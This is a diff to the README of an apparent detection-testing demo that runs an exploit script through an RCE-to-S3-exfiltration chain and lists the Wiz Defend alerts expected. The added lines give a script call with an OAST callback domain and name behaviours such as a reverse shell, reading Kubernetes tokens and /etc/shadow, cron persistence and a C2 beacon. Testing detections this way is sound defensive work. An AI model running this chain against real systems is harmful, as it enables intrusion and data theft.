@@ -369,8 +369,11 @@ React2Shell (RCE) → Container Activity → Cloud Identity → S3 Exfil
 # Auto-detect S3 bucket from terraform:
 ./scripts/exploit/wiz-demo-v4.sh <nlb-hostname>
 
+# With OAST/interact.sh callback:
+./scripts/exploit/wiz-demo-v4.sh <nlb-hostname> --oast-domain abc123.oast.fun
+
 # Manual bucket specification:
-./scripts/exploit/wiz-demo-v4.sh <nlb-hostname> <s3-bucket-name>
+./scripts/exploit/wiz-demo-v4.sh <nlb-hostname> --bucket my-sensitive-bucket
 ```
 
 **Expected Wiz Defend Detections:**
@@ -379,6 +382,9 @@ React2Shell (RCE) → Container Activity → Cloud Identity → S3 Exfil
 |-------|-----------|---------|-------------|
 | 1. Initial Access | Web service command | (signal) | `webServiceOrDescendantOf` context |
 | 2. Container Activity | Reverse shell pattern | `cer-sen-id-458` | Bash reverse shell command line |
+| 2. Container Activity | Cryptomining DNS | `cer-sen-id-10` | DNS query to mining pool |
+| 2. Container Activity | Tunneling DNS | `cer-sen-id-323` | DNS query to ngrok/tunneling |
+| 2. Container Activity | OAST callback | (optional) | C2 beacon if --oast-domain set |
 | 2. Container Activity | Sensitive file access | `cer-sen-id-*` | K8s token, /etc/shadow |
 | 2. Container Activity | Cron persistence | `cer-sen-id-6` | Crontab modification |
 | 3. Cloud Identity | Unusual STS call | `cer-aws-identity-unusualGetCallerIdentity` | GetCallerIdentity from pod |
